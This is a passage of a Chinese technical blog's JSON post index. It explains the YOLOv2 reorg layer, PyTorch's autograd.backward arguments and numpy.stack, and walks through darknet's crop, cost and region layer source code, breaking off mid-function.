h*(k + c*b)); int c2 = k % out_c; int offset = k / out_c; int w2 = i*stride + offset % stride; int h2 = j*stride + offset / stride; int out_index = w2 + w*stride*(h2 + h*stride*(c2 + out_c*b)); if(forward) out[out_index] = x[in_index]; else out[in_index] = x[out_index]; &#125; &#125; &#125; &#125;&#125;","text":"文章全部YOLOv2源码分析 reorg layer中最关键的代码如下 12345678910111213141516171819202122void reorg_cpu(float *x, int w, int h, int c, int batch, int stride, int forward, float *out)&#123; int b,i,j,k; int out_c = c/(stride*stride); for(b = 0; b &lt; batch; ++b)&#123; for(k = 0; k &lt; c; ++k)&#123; for(j = 0; j &lt; h; ++j)&#123; for(i = 0; i &lt; w; ++i)&#123; int in_index = i + w*(j + h*(k + c*b)); int c2 = k % out_c; int offset = k / out_c; int w2 = i*stride + offset % stride; int h2 = j*stride + offset / stride; int out_index = w2 + w*stride*(h2 + h*stride*(c2 + out_c*b)); if(forward) out[out_index] = x[in_index]; else out[in_index] = x[out_index]; &#125; &#125; &#125; &#125;&#125; 这一部分表述为数学公式就是 $in_index=W_1+Wstride(H_1+H(C_1+CB))$ $C_2=C_1\\%C_{out}$ $offset = C_1/C_{out}$ $W_2=W_1*stride+offset\\%stride$ $H_2=H_1*stride+offset/stride$ $out_index = W_2+Wstride(H_2+Hstride(C_2+C_{out}*B))$ 对于前向传播，想要表达的意思就是下面这个图 那么我们知道，矩阵运算可以更加简洁的表示上面的代码中的循环，我这里给出pytorch下的代码示例 12345B,C,H,W = input.size()input = input.view(B, C, H/stride, stride, W/stride, stride).transpose(3,4).contiguous()input = input.view(B, C, H/stride*W/stride, stride*stride).transpose(2,3).contiguous()input = input.view(B, C, stride*stride, H/stride, W/stride).transpose(1,2).contiguous()input = input.view(B, stride*stride*C, H/stride, W/stride) 非常简洁的就解决了上述的问题，但是简洁背后的数学原理你要明白。 首先我先说一下这里的参数含义: B:batch C:通道数目 H:高 W:宽 按照论文中的做法，我们这里stride取2 1input = input.view(B, C, H/stride, stride, W/stride, stride).transpose(3,4).contiguous() 这里的view函数的意义，我么可以理解为“看成” 这个式子想要表达的含义如下图： 1input = input.view(B, C, H/stride*W/stride, stride*stride).transpose(2,3).contiguous() 这个式子想要表达的含义如下图： 从第一个式子到第二个式子的过程我们可以抽象为 1input = input.view(B, C, stride*stride, H/stride, W/stride).transpose(1,2).contiguous() 这个式子想要表达的含义如下图： 最后抽象为 觉得不错，点个赞吧b(￣▽￣)d 由于本人水平有限，文中有不对之处，希望大家指出，谢谢^_^!","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"yolo","slug":"yolo","permalink":"http://coordinate.wang/tags/yolo/"}]},{"title":"torch.autograd.backward中的参数问题","slug":"2017-12-30-torch.autograd.backward中的参数问题","date":"2017-12-29T16:00:00.000Z","updated":"2018-02-18T08:46:16.539Z","comments":true,"path":"2017/12/30/2017-12-30-torch.autograd.backward中的参数问题/","link":"","permalink":"http://coordinate.wang/2017/12/30/2017-12-30-torch.autograd.backward中的参数问题/","excerpt":"torch.autograd.backward(variables, grad_variables=None, retain_graph=None, create_graph=False) 给定图的叶子节点variables, 计算图中变量的梯度和。 计算图可以通过链式法则求导。如果variables中的任何一个variable是 非标量(non-scalar)的，且requires_grad=True。那么此函数需要指定grad_variables，它的长度应该和variables的长度匹配，里面保存了相关variable的梯度(对于不需要gradient tensor的variable，None是可取的)。 此函数累积leaf variables计算的梯度。你可能需要在调用此函数之前将leaf variable的梯度置零。 参数： variables（变量的序列） - 被求微分的叶子节点，即 ys 。 grad_variables（（张量，变量）的序列或无） - 对应variable的梯度。仅当variable不是标量且需要求梯度的时候使用。 retain_graph（bool，可选） - 如果为False，则用于释放计算grad的图。请注意，在几乎所有情况下，没有必要将此选项设置为True，通常可以以更有效的方式解决。默认值为create_graph的值。 create_graph（bool，可选） - 如果为True，则将构造派生图，允许计算更高阶的派生产品。默认为False。","text":"torch.autograd.backward(variables, grad_variables=None, retain_graph=None, create_graph=False) 给定图的叶子节点variables, 计算图中变量的梯度和。 计算图可以通过链式法则求导。如果variables中的任何一个variable是 非标量(non-scalar)的，且requires_grad=True。那么此函数需要指定grad_variables，它的长度应该和variables的长度匹配，里面保存了相关variable的梯度(对于不需要gradient tensor的variable，None是可取的)。 此函数累积leaf variables计算的梯度。你可能需要在调用此函数之前将leaf variable的梯度置零。 参数： variables（变量的序列） - 被求微分的叶子节点，即 ys 。 grad_variables（（张量，变量）的序列或无） - 对应variable的梯度。仅当variable不是标量且需要求梯度的时候使用。 retain_graph（bool，可选） - 如果为False，则用于释放计算grad的图。请注意，在几乎所有情况下，没有必要将此选项设置为True，通常可以以更有效的方式解决。默认值为create_graph的值。 create_graph（bool，可选） - 如果为True，则将构造派生图，允许计算更高阶的派生产品。默认为False。 我这里举一个官方的例子 12345678import torchfrom torch.autograd import Variablex = Variable(torch.ones(2, 2), requires_grad=True)y = x + 2z = y * y * 3out = z.mean()out.backward()#这里是默认情况，相当于out.backward(torch.Tensor([1.0]))print(x.grad) 输出结果是 1234Variable containing: 4.5000 4.5000 4.5000 4.5000[torch.FloatTensor of size 2x2] $out = \\frac{1}{4}\\sum_i z_i$，$z_i = 3(x_i+2)^2$并且$z_i\\bigr\\rvert_{x_i=1} = 27$。接着$\\frac{\\partial out}{\\partial x_i} = \\frac{3}{2}(x_i+2)$，因此$\\frac{\\partial out}{\\partial x_i}\\bigr\\rvert_{x_i=1} = \\frac{9}{2} = 4.5$ 接着我们继续 12345678910x = torch.randn(3)x = Variable(x, requires_grad=True)y = x * 2while y.data.norm() &lt; 1000: y = y * 2gradients = torch.FloatTensor([0.1, 1.0, 0.0001])y.backward(gradients)print(x.grad) 输出结果是 12345Variable containing: 204.8000 2048.0000 0.2048[torch.FloatTensor of size 3] 这里这个gradients为什么要是[0.1, 1.0, 0.0001]？ 如果输出的多个loss权重不同的话，例如有三个loss，一个是x loss，一个是y loss，一个是class loss。那么很明显的不可能所有loss对结果影响程度都一样，他们之间应该有一个比例。那么比例这里指的就是[0.1, 1.0, 0.0001]，这个问题中的loss对应的就是上面说的y，那么这里的输出就很好理解了dy/dx=0.1*dy1/dx+1.0*dy2/dx+0.0001*dy3/dx。 如有问题希望大家指正，谢谢^_^!","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"pytorch","slug":"pytorch","permalink":"http://coordinate.wang/tags/pytorch/"}]},{"title":"numpy.stack最通俗的理解","slug":"2017-12-29-numpy.stack最通俗的理解","date":"2017-12-28T16:00:00.000Z","updated":"2018-02-18T08:46:08.892Z","comments":true,"path":"2017/12/29/2017-12-29-numpy.stack最通俗的理解/","link":"","permalink":"http://coordinate.wang/2017/12/29/2017-12-29-numpy.stack最通俗的理解/","excerpt":"numpy.stack(arrays, axis=0) 沿着新轴连接数组的序列。 axis参数指定新轴在结果尺寸中的索引。例如，如果axis=0，它将是第一个维度，如果axis=-1，它将是最后一个维度。 参数： 数组：array_like的序列每个数组必须具有相同的形状。axis：int，可选输入数组沿其堆叠的结果数组中的轴。 返回： 堆叠：ndarray堆叠数组比输入数组多一个维。 上面是官方给出的解释，很难理解。 我们先从增加维度说起。","text":"numpy.stack(arrays, axis=0) 沿着新轴连接数组的序列。 axis参数指定新轴在结果尺寸中的索引。例如，如果axis=0，它将是第一个维度，如果axis=-1，它将是最后一个维度。 参数： 数组：array_like的序列每个数组必须具有相同的形状。axis：int，可选输入数组沿其堆叠的结果数组中的轴。 返回： 堆叠：ndarray堆叠数组比输入数组多一个维。 上面是官方给出的解释，很难理解。 我们先从增加维度说起。 12345678910&gt;&gt;&gt; a = np.array([1, 2, 3])&gt;&gt;&gt; b = np.array([2, 3, 4])&gt;&gt;&gt; a.shape(3,)&gt;&gt;&gt; b.shape(3,)&gt;&gt;&gt; np.stack((a, b), axis=0).shape(2, 3)&gt;&gt;&gt; np.stack((a, b), axis=1).shape(3, 2) 我先说一说这里(2,3)和(3,2)中的2是怎么来的：因为有a和b两个array。如果这里我们增加一个c= np.array([3, 4, 5])，那么这里我们改变原来的np.stack就会变成下面这样： 12345&gt;&gt;&gt; c = np.array([3, 4, 5])&gt;&gt;&gt; np.stack((a, b, c), axis=0).shape(3, 3)&gt;&gt;&gt; np.stack((a, b, c), axis=1).shape(3, 3) 那么因为这里是a,b,c三个array，所以这里2变成了3 接着说说这个axis参数的意义，我们可以理解这里的axis就是要增加哪一个维度，比如说这里的axis=0，就是增加第一维度，所以这里的(2,3)中的2在第一个位置。axis=1，就是增加第二维度，所以这里的(3,2)中的2在第二个位置。 我现在举一个稍微复杂的例子 123456789101112&gt;&gt;&gt; a = np.array([[1, 2, 3], [1, 2, 3], [1, 2, 3]])&gt;&gt;&gt; b = np.array([[4, 5, 6], [4, 5, 6], [4, 5, 6]])&gt;&gt;&gt; a.shape(3, 3)&gt;&gt;&gt; b.shape(3, 3)&gt;&gt;&gt; np.stack((a, b), axis=0).shape(2, 3, 3)&gt;&gt;&gt; np.stack((a, b), axis=1).shape(3, 2, 3)&gt;&gt;&gt; np.stack((a, b), axis=2).shape(3, 3, 2) 这里的2就是指的a和b，而2放在什么位置是根据axis来确定的。 接着说一下矩阵的坐标 1234a a的元素对应的坐标[1 2 3] (0,0) (0,1) (0,2)[1 2 3] (1,0) (1,1) (1,2)[1 2 3] (2,0) (2,1) (2,2) 很好理解。 接着以np.stack((a, b), axis=1)为例子 1234567891011&gt;&gt;&gt; np.stack((a, b), axis=1).shape(3, 2, 3)&gt;&gt;&gt; np.stack((a, b), axis=1)array([[[1, 2, 3], [4, 5, 6]], [[1, 2, 3], [4, 5, 6]], [[1, 2, 3], [4, 5, 6]]]) 原来我们a[0][0]=1，现在中间加上一个维度（因为这里axis=1），就变成了a[0][0][0]=1，注意这里为什么中间是0，因为np.stack((a, b), axis=1)中，a在b的前面。同理 1234a a的元素对应的坐标[1 2 3] (0,0,0) (0,0,1) (0,0,2)[1 2 3] (1,0,0) (1,0,1) (1,0,2)[1 2 3] (2,0,0) (2,0,1) (2,0,2) 那么b[0][0]=4，因为np.stack((a, b), axis=1)中，b在a的后面。所以b[0][1][0]=4 1234b b的元素对应的坐标[4 5 6] (0,1,0) (0,1,1) (0,1,2)[4 5 6] (1,1,0) (1,1,1) (1,1,2)[4 5 6] (2,1,0) (2,1,1) (2,1,2) 接着将对应坐标的数组合，就得到了新的array 123456789 元素对应的坐标array([[[1, 2, 3], (0,0,0) (0,0,1) (0,0,2) [4, 5, 6]], (0,1,0) (0,1,1) (0,1,2) [[1, 2, 3], (1,0,0) (1,0,1) (1,0,2) [4, 5, 6]], (1,1,0) (1,1,1) (1,1,2) [[1, 2, 3], (2,0,0) (2,0,1) (2,0,2) [4, 5, 6]]]) (2,1,0) (2,1,1) (2,1,2) 还有一个更加简单的理解方式（堆叠） 对于axis=1，就是横着切开，对应行横着堆 对于axis=2，就是横着切开，对应行竖着堆 对于axis=0，就是不切开，两个堆一起。 就是这么的简单^_^! 觉得不错，点个赞吧b(￣▽￣)d","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"numpy","slug":"numpy","permalink":"http://coordinate.wang/tags/numpy/"}]},{"title":"YOLOv2代码分析（六）","slug":"2017-12-25-YOLOv2代码分析（七）","date":"2017-12-24T16:00:00.000Z","updated":"2018-02-18T08:45:37.037Z","comments":true,"path":"2017/12/25/2017-12-25-YOLOv2代码分析（七）/","link":"","permalink":"http://coordinate.wang/2017/12/25/2017-12-25-YOLOv2代码分析（七）/","excerpt":"原本一开始上来我们是要说LSTM和CRNN的，因为我觉得这部分内容对于YOLOv2来说并没有那么重要，所以我打算放到最后去讲。 我们再次回到了parse_network_cfg函数 1234//parse_network_cfgelse if(lt == CONNECTED)&#123; l = parse_connected(options, params); &#125; 接着看后面这个parse_connected函数","text":"原本一开始上来我们是要说LSTM和CRNN的，因为我觉得这部分内容对于YOLOv2来说并没有那么重要，所以我打算放到最后去讲。 我们再次回到了parse_network_cfg函数 1234//parse_network_cfgelse if(lt == CONNECTED)&#123; l = parse_connected(options, params); &#125; 接着看后面这个parse_connected函数 0x01 parse_connected12345678910layer parse_connected(list *options, size_params params)&#123; int output = option_find_int(options, \"output\",1); char *activation_s = option_find_str(options, \"activation\", \"logistic\"); ACTIVATION activation = get_activation(activation_s); int batch_normalize = option_find_int_quiet(options, \"batch_normalize\", 0); layer l = make_connected_layer(params.batch, params.inputs, output, activation, batch_normalize, params.net-&gt;adam); return l;&#125; 上面的一些参数我在之前的文章中已经说过了，这里就不再说明了。关键函数make_connected_layer，我在（六）也说过了，这里也不再提。 回到parse_network_cfg函数 1234//parse_network_cfgelse if(lt == CROP)&#123; l = parse_crop(options, params); &#125; 0x02 parse_crop1234567891011121314151617181920212223crop_layer parse_crop(list *options, size_params params)&#123; int crop_height = option_find_int(options, \"crop_height\",1); int crop_width = option_find_int(options, \"crop_width\",1); int flip = option_find_int(options, \"flip\",0); float angle = option_find_float(options, \"angle\",0);//旋转角度 float saturation = option_find_float(options, \"saturation\",1);//曝光量 float exposure = option_find_float(options, \"exposure\",1);//饱和度 int batch,h,w,c; h = params.h; w = params.w; c = params.c; batch=params.batch; if(!(h &amp;&amp; w &amp;&amp; c)) error(\"Layer before crop layer must output image.\"); int noadjust = option_find_int_quiet(options, \"noadjust\",0);//是否调整 crop_layer l = make_crop_layer(batch,h,w,c,crop_height,crop_width,flip, angle, saturation, exposure); l.shift = option_find_float(options, \"shift\", 0);//是否移动 l.noadjust = noadjust; return l;&#125; 接着看关键函数make_crop_layer 0x0201 make_crop_layer这一层主要是对照片数据进行处理的 12345678910111213141516171819202122232425262728293031crop_layer make_crop_layer(int batch, int h, int w, int c, int crop_height, int crop_width, int flip, float angle, float saturation, float exposure)&#123; fprintf(stderr, \"Crop Layer: %d x %d -&gt; %d x %d x %d image\\n\", h,w,crop_height,crop_width,c); crop_layer l = &#123;0&#125;; l.type = CROP; l.batch = batch; l.h = h; l.w = w; l.c = c; l.scale = (float)crop_height / h; l.flip = flip; l.angle = angle; l.saturation = saturation; l.exposure = exposure; l.out_w = crop_width; //输出宽度 l.out_h = crop_height; //输出高度 l.out_c = c; l.inputs = l.w * l.h * l.c; l.outputs = l.out_w * l.out_h * l.out_c; l.output = calloc(l.outputs*batch, sizeof(float)); l.forward = forward_crop_layer; l.backward = backward_crop_layer; #ifdef GPU l.forward_gpu = forward_crop_layer_gpu; l.backward_gpu = backward_crop_layer_gpu; l.output_gpu = cuda_make_array(l.output, l.outputs*batch); l.rand_gpu = cuda_make_array(0, l.batch*8); #endif return l;&#125; 参数信息我之前都说过了，不再提了，直接看关键函数forward_crop_layer和backward_crop_layer 0x020101 forward_crop_layer123456789101112131415161718192021222324252627282930313233343536void forward_crop_layer(const crop_layer l, network net)&#123; int i,j,c,b,row,col; int index; int count = 0; int flip = (l.flip &amp;&amp; rand()%2); //随机反转 int dh = rand()%(l.h - l.out_h + 1);//0~[h-out_h] int dw = rand()%(l.w - l.out_w + 1);//0~[w-out_w] float scale = 2; float trans = -1; if(l.noadjust)&#123;//是否调整图片 scale = 1; trans = 0; &#125; if(!net.train)&#123; flip = 0; dh = (l.h - l.out_h)/2; dw = (l.w - l.out_w)/2; &#125; for(b = 0; b &lt; l.batch; ++b)&#123; for(c = 0; c &lt; l.c; ++c)&#123; for(i = 0; i &lt; l.out_h; ++i)&#123; for(j = 0; j &lt; l.out_w; ++j)&#123; if(flip)&#123;//图片是否反转 col = l.w - dw - j - 1;//反转，w~0 &#125;else&#123; col = j + dw;//不反转,0~w &#125; row = i + dh; index = col+l.w*(row+l.h*(c + l.c*b)); l.output[count++] = net.input[index]*scale + trans; &#125; &#125; &#125; &#125;&#125; 后面没什么好说的了 0x020102 backward_crop_layer1void backward_crop_layer(const crop_layer l, network net)&#123;&#125; backward_crop_layer没有任何操作 回到parse_network_cfg函数 1234//parse_network_cfgelse if(lt == COST)&#123; l = parse_cost(options, params); &#125; 0x03 parse_cost1234567891011cost_layer parse_cost(list *options, size_params params)&#123; char *type_s = option_find_str(options, \"type\", \"sse\"); COST_TYPE type = get_cost_type(type_s); float scale = option_find_float_quiet(options, \"scale\",1); cost_layer layer = make_cost_layer(params.batch, params.inputs, type, scale); layer.ratio = option_find_float_quiet(options, \"ratio\",0);//缩放比例 layer.noobject_scale = option_find_float_quiet(options, \"noobj\", 1);//noobject_scale layer.thresh = option_find_float_quiet(options, \"thresh\",0);//决定cost function是否有IOU return layer;&#125; 这里有两个结构体COST_TYPE和cost_layer 123typedef enum&#123; SSE, MASKED, L1, SEG, SMOOTH&#125; COST_TYPE; 这个结构体包含了不同的损失函数。 1typedef layer cost_layer; 这个结构体就是前面YOLOv2源码分析（二）中的layer结构。 0x0301 make_cost_layer这个函数就是建立计算损失函数的层 1234567891011121314151617181920212223242526cost_layer make_cost_layer(int batch, int inputs, COST_TYPE cost_type, float scale)&#123; fprintf(stderr, \"cost %4d\\n\", inputs); cost_layer l = &#123;0&#125;; l.type = COST; l.scale = scale; l.batch = batch; l.inputs = inputs; l.outputs = inputs; l.cost_type = cost_type; l.delta = calloc(inputs*batch, sizeof(float)); l.output = calloc(inputs*batch, sizeof(float)); l.cost = calloc(1, sizeof(float)); l.forward = forward_cost_layer; l.backward = backward_cost_layer; #ifdef GPU l.forward_gpu = forward_cost_layer_gpu; l.backward_gpu = backward_cost_layer_gpu; l.delta_gpu = cuda_make_array(l.output, inputs*batch); l.output_gpu = cuda_make_array(l.delta, inputs*batch); #endif return l;&#125; 这里的参数没什么重要的，直接看最重要的两个函数forward_cost_layer和backward_cost_layer 0x030101 forward_cost_layer12345678910111213141516171819#define SECRET_NUM -1234void forward_cost_layer(cost_layer l, network net)&#123; if (!net.truth) return; if(l.cost_type == MASKED)&#123; int i; for(i = 0; i &lt; l.batch*l.inputs; ++i)&#123; if(net.truth[i] == SECRET_NUM) net.input[i] = SECRET_NUM; &#125; &#125; if(l.cost_type == SMOOTH)&#123; smooth_l1_cpu(l.batch*l.inputs, net.input, net.truth, l.delta, l.output); &#125;else if(l.cost_type == L1)&#123; l1_cpu(l.batch*l.inputs, net.input, net.truth, l.delta, l.output); &#125; else &#123; l2_cpu(l.batch*l.inputs, net.input, net.truth, l.delta, l.output); &#125; l.cost[0] = sum_array(l.output, l.batch*l.inputs);//计算和&#125; 如果我们损失函数使用的是MASKED的话。判断输入的标签数据是SECRET_NUM，将网络的输入数据设置为SECRET_NUM，这个函数主要在darknet9000.cfg中 如果我们损失函数使用的是SMOOTH的话 12345678910111213141516void smooth_l1_cpu(int n, float *pred, float *truth, float *delta, float *error)&#123; int i; for(i = 0; i &lt; n; ++i)&#123; float diff = truth[i] - pred[i]; float abs_val = fabs(diff); if(abs_val &lt; 1) &#123; error[i] = diff * diff; delta[i] = diff; &#125; else &#123; error[i] = 2*abs_val - 1; delta[i] = (diff &lt; 0) ? 1 : -1; &#125; &#125;&#125; 如果误差的绝对值小于1，就计算平方；如果误差的绝对值大于1，就用两倍的误差绝对值减1。 如果我们的损失函数使用的是L1的话 123456789void l1_cpu(int n, float *pred, float *truth, float *delta, float *error)&#123; int i; for(i = 0; i &lt; n; ++i)&#123; float diff = truth[i] - pred[i]; error[i] = fabs(diff); delta[i] = diff &gt; 0 ? 1 : -1; &#125;&#125; 这就是一个l1范数，计算误差绝对值 如果我们的损失函数都不是前面的话，我们使用L2 123456789void l2_cpu(int n, float *pred, float *truth, float *delta, float *error)&#123; int i; for(i = 0; i &lt; n; ++i)&#123; float diff = truth[i] - pred[i]; error[i] = diff * diff; delta[i] = diff; &#125;&#125; 计算误差平方 0x030102 backward_cost_layer1234void backward_cost_layer(const cost_layer l, network net)&#123; axpy_cpu(l.batch*l.inputs, l.scale, l.delta, 1, net.delta, 1);&#125; 这里面的函数axpy_cpu我在之前的 YOLOv2源码分析（三）说过了。 回到parse_network_cfg函数 1234//parse_network_cfgelse if(lt == REGION)&#123; l = parse_region(options, params); &#125; 0x04 parse_region123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051layer parse_region(list *options, size_params params)&#123; int coords = option_find_int(options, \"coords\", 4); int classes = option_find_int(options, \"classes\", 20); int num = option_find_int(options, \"num\", 1);//anchors个数 layer l = make_region_layer(params.batch, params.w, params.h, num, classes, coords); assert(l.outputs == params.inputs); l.log = option_find_int_quiet(options, \"log\", 0);//是否计算log l.sqrt = option_find_int_quiet(options, \"sqrt\", 0);//预测w,h是否开方 l.softmax = option_find_int(options, \"softmax\", 0);//是否采用softmax分类 l.background = option_find_int_quiet(options, \"background\", 0); l.max_boxes = option_find_int_quiet(options, \"max\",30);//设置一幅图片最多可以生成目标框的数量 l.jitter = option_find_float(options, \"jitter\", .2);//抖动 l.rescore = option_find_int_quiet(options, \"rescore\",0);//为1时，在计算选择的anchor与真实target的IOU；当为0时，直接认为置信度为1 l.thresh = option_find_float(options, \"thresh\", .5);//大于该值认为包含目标 l.classfix = option_find_int_quiet(options, \"classfix\", 0); l.absolute = option_find_int_quiet(options, \"absolute\", 0); l.random = option_find_int_quiet(options, \"random\", 0); l.coord_scale = option_find_float(options, \"coord_scale\", 1);//坐标损失权重 l.object_scale = option_find_float(options, \"object_scale\", 1);//有目标损失权重 l.noobject_scale = option_find_float(options, \"noobject_scale\", 1);//无目标损失权重 l.mask_scale = option_find_float(options, \"mask_scale\", 1); l.class_scale = option_find_float(options, \"class_scale\", 1);//类别损失权重 l.bias_match = option_find_int_quiet(options, \"bias_match\",0); char *tree_file = option_find_str(options, \"tree\", 0); if (tree_file) l.softmax_tree = read_tree(tree_file); char *map_file = option_find_str(options, \"map\", 0); if (map_file) l.map = read_map(map_file); char *a = option_find_str(options, \"anchors\", 0); if(a)&#123; int len = strlen(a); int n = 1; int i; for(i = 0; i &lt; len; ++i)&#123; if (a[i] == ',') ++n; &#125; for(i = 0; i &lt; n; ++i)&#123; float bias = atof(a); l.biases[i] = bias; a = strchr(a, ',')+1; &#125; &#125; return l;&#125; 0x0401 make_region_layer1234567891011121314151617181920212223242526272829303132333435363738region_layer make_region_layer(int batch, int w, int h, int n, int classes, int coords)&#123; region_layer l = &#123;0&#125;; l.type = REGION; l.n = n;//anchors个数 l.batch = batch; l.h = h; l.w = w; l.classes = classes;//目标的种类个数 l.coords = coords;//坐标参数（4） l.cost = calloc(1, sizeof(float)); l.biases = calloc(n*2, sizeof(float)); l.bias_updates = calloc(n*2, sizeof(float)); l.outputs = h*w*n*(classes + coords + 1); l.inputs = l.outputs; l.truths = 30*(5);//5表示class以及coordinate（xywh），30表示一幅图片最多有多少目标在相同位置 l.delta = calloc(batch*l.outputs, sizeof(float)); l.output = calloc(batch*l.outputs, sizeof(float)); int i; for(i = 0; i &lt; n*2; ++i)&#123; l.biases[i] = .5; &#125; l.forward = forward_region_layer; l.backward = backward_region_layer;#ifdef GPU l.forward_gpu = forward_region_layer_gpu; l.backward_gpu = backward_region_layer_gpu; l.output_gpu = cuda_make_array(l.output, batch*l.outputs); l.delta_gpu = cuda_make_array(l.delta, batch*l.outputs);#endif fprintf(stderr, \"detection\\n\"); srand(0); return l;&#125; 0x040101 forward_region_layer这是一个非常重要的函数 1234567891011121314151617181920212223void forward_region_layer(const layer l, network net)&#123; int i,j,b,t,n; memcpy(l.output, net.input, l.outputs*l.batch*sizeof(float));...gpu部分去除了 memset(l.delta, 0, l.outputs * l.batch * sizeof(float));//delta清空 if(!net.train) return; //如果不是train，那么退出 float avg_iou = 0; //平均IOU float recall = 0; //召回率 float avg_cat = 0; //平均类别辨识率 float avg_obj = 0; //平均目标识别率 float avg_anyobj = 0; int count = 0; //要检测的目标数目 int class_count = 0; *(l.cost) = 0; for (b = 0; b &lt; l.batch; ++b) &#123; if(l.softmax_tree)&#123;//以下部分属于YOLO9000 int onlyclass = 0; for(t = 0; t &lt; 30; ++t)&#123; box truth = float_to_box(net.truth + t*(l.coords + 1) + b*l.truths, 1); if(!truth.x) break; 这里的net.truth指针，指向存储网络输入图片中的标注矩形框信息。这里的l.truths在make_region_layer 函数中已经说过了（30*(5) 5表示class以及coordinate（xywh），30表示一幅图片最多处理多少个目标框）。好的，我们现在看看float_to_box函数的作用 123456789101112typedef struct&#123; float x, y, w, h;&#125; box;box float_to_box(float *f, int stride)&#123; box b; b.x = f[0]; b.y = f[1*stride]; b.w = f[2*stride]; b.h = f[3*stride]; return b;&#125; 这个函数的作用很简单，这个函数在此处的作用就是将每个batch中每个目标的矩形框信息存储到box对象中。接着看这个函数forward_region_layer 12345678910111213141516 //forward_region_layerint class = net.truth[t*(l.coords + 1) + b*l.truths + l.coords];//存储每个batch中每个目标标注的类别信息 float maxp = 0; int maxi = 0; if(truth.x &gt; 100000 &amp;&amp; truth.y &gt; 100000)&#123; for(n = 0; n &lt; l.n*l.w*l.h; ++n)&#123; int class_index = entry_index(l, b, n, l.coords + 1); int obj_index = entry_index(l, b, n, l.coords); float scale = l.output[obj_index]; l.delta[obj_index] = l.noobject_scale * (0 - l.output[obj_index]); float p = scale*get_hierarchy_probability(l.output + class_index, l.softmax_tree, class, l.w*l.h); if(p &gt; maxp)&#123; maxp = p; maxi = n; &#125; &#125; 我们先看函数entry_index 123456int entry_index(layer l, int batch, int location, int entry)&#123; int n = location / (l.w*l.h); int loc = location % (l.w*l.h); return batch*l.outputs + n*l.w*l.h*(l.coords+l.classes+1) + entry*l.w*l.h + loc;&#125; 我们先看看class_index得到的是什么。首先batch表示一个batch输入图片数量，location表示0~n*w*h，entry=5。我这里先说一下output的形式batch*h*w*n*(classes + coords + 1)，这是有前面代码推出来的。通过entry_index函数返回的是输出的第n个像素对应的class信息的位置。 而obj_index得到的是输出的第n个像素对应的confidence信息的位置。scale就是对应的confidence。 接着后面计算误差，这个对应于YOLOv1中的 $\\lambda_{noobj}\\sum_{i=0}^{l.w*l.h}1_{ij}^{noobj}(C_i-\\hat C_i)^2$ 上面的式子对应于本文做了一些修改。 再看函数get_hierarchy_probability 123456789float get_hierarchy_probability(float *x, tree *hier, int c, int stride)&#123; float p = 1; while(c &gt;= 0)&#123; p = p * x[c*stride]; c = hier-&gt;parent[c]; &#125; return p;&#125; 之前我们说过这个tree存储的是一个wordtree。 接着我们继续分析forward_region_layer后面的内容 1234567891011121314 //forward_region_layerint class_index = entry_index(l, b, maxi, l.coords + 1); int obj_index = entry_index(l, b, maxi, l.coords); delta_region_class(l.output, l.delta, class_index, class, l.classes, l.softmax_tree, l.class_scale, l.w*l.h, &amp;avg_cat, !l.softmax); if(l.output[obj_index] &lt; .3) l.delta[obj_index] = l.object_scale * (.3 - l.output[obj_index]); else l.delta[obj_index] = 0; l.delta[obj_index] = 0; ++class_count; onlyclass = 1; break; &#125; &#125; if(onlyclass) continue; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697//forward_region_layer for (j = 0; j &lt; l.h; ++j) &#123; for (i = 0; i &lt; l.w; ++i) &#123; for (n = 0; n &lt; l.n; ++n) &#123; int box_index = entry_index(l, b, n*l.w*l.h + j*l.w + i, 0); box pred = get_region_box(l.output, l.biases, n, box_index, i, j, l.w, l.h, l.w*l.h); float best_iou = 0; for(t = 0; t &lt; 30; ++t)&#123; box truth = float_to_box(net.truth + t*(l.coords + 1) + b*l.truths, 1); if(!truth.x) break; float iou = box_iou(pred, truth); if (iou &gt; best_iou) &#123; best_iou = iou; &#125; &#125; int obj_index = entry_index(l, b, n*l.w*l.h + j*l.w + i, l.coords); avg_anyobj += l.output[obj_index]; l.delta[obj_index] = l.noobject_scale * (0 - l.output[obj_index]); if(l.background) l.delta[obj_index] = l.noobject_scale * (1 - l.output[obj_index]); if (best_iou &gt; l.thresh) &#123; l.delta[obj_index] = 0; &#125; if(*(net.seen) &lt; 12800)&#123; box truth = &#123;0&#125;; truth.x = (i + .5)/l.w; truth.y = (j + .5)/l.h; truth.w = l.biases[2*n]/l.w; truth.h = l.biases[2*n+1]/l.h; delta_region_box(truth, l.output, l.biases, n, box_index, i, j, l.w, l.h, l.delta, .01, l.w*l.h); &#125; &#125; &#125; &#125; for(t = 0; t &lt; 30; ++t)&#123;//这里的30是在前面parse_region中设置的 box truth = float_to_box(net.truth + t*(l.coords + 1) + b*l.truths, 1); if(!truth.x) break; float best_iou = 0; int best_n = 0; i = (truth.x * l.w); j = (truth.y * l.h); //printf(\"%d %f %d %f\\n\", i, truth.x*l.w, j, truth.y*l.h); box truth_shift = truth; truth_shift.x = 0; truth_shift.y = 0; //printf(\"index %d %d\\n\",i, j); for(n = 0; n &lt; l.n; ++n)&#123; int box_index = entry_index(l, b, n*l.w*l.h + j*l.w + i, 0); box pred = get_region_box(l.output, l.biases, n, box_index, i, j, l.w, l.h, l.w*l.h); if(l.bias_match)&#123; pred.w = l.biases[2*n]/l.w; pred.h = l.biases[2*n+1]/l.h; &#125; //printf(\"pred: (%f, %f) %f x %f\\n\", pred.x, pred.y, pred.w, pred.h); pred.x = 0; pred.y = 0; float iou = box_iou(pred, truth_shift); if (iou &gt; best_iou)&#123; best_iou = iou; best_n = n; &#125; &#125; //printf(\"%d %f (%f, %f) %f x %f\\n\", best_n, best_iou, truth.x, truth.y, truth.w, truth.h); int box_index = entry_index(l, b, best_n*l.w*l.h + j*l.w + i, 0); float iou = delta_region_box(truth, l.output, l.biases, best_n, box_index, i, j, l.w, l.h, l.delta, l.coord_scale * (2 - truth.w*truth.h), l.w*l.h); if(l.coords &gt; 4)&#123; int mask_index = entry_index(l, b, best_n*l.w*l.h + j*l.w 